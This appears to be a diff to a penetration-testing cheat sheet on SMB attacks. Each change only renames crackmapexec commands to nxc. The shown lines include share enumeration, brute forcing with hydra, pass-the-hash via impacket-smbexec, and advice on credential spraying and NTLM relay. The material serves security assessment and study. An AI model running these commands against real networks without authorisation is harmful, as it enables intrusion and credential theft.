@@ -9,7 +9,7 @@
 
 ```bash
 nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
-crackmapexec smb 10.10.10.10
+nxc smb 10.10.10.10
 enum4linux-ng -A 10.10.10.10
 ```
 
@@ -21,7 +21,7 @@ enum4linux-ng -A 10.10.10.10
 smbclient -L //10.10.10.10 -U ''
 smbclient -L //10.10.10.10 -U guest
 nmap --script smb-enum-shares -p 445 10.10.10.10
-crackmapexec smb 10.10.10.10 --shares
+nxc smb 10.10.10.10 --shares
 ```
 
 Connect to a share:
@@ -42,7 +42,7 @@ smb> mget *
 ## Brute Force
 
 ```bash
-crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
+nxc smb 10.10.10.10 -u users.txt -p passwords.txt
 hydra -L users.txt -P passwords.txt smb://10.10.10.10
 ```
 
@@ -51,7 +51,7 @@ hydra -L users.txt -P passwords.txt smb://10.10.10.10
 ## Pass-the-Hash
 
 ```bash
-crackmapexec smb 10.10.10.10 -u Administrator -H <ntlm-hash>
+nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
 impacket-smbexec EXAMPLE/Administrator@10.10.10.10 -hashes :<ntlm-hash>
 ```
 
@@ -95,4 +95,4 @@ exploit
 ```
 
 !!! tip "Real-world"
-    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `crackmapexec smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
+    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt`.
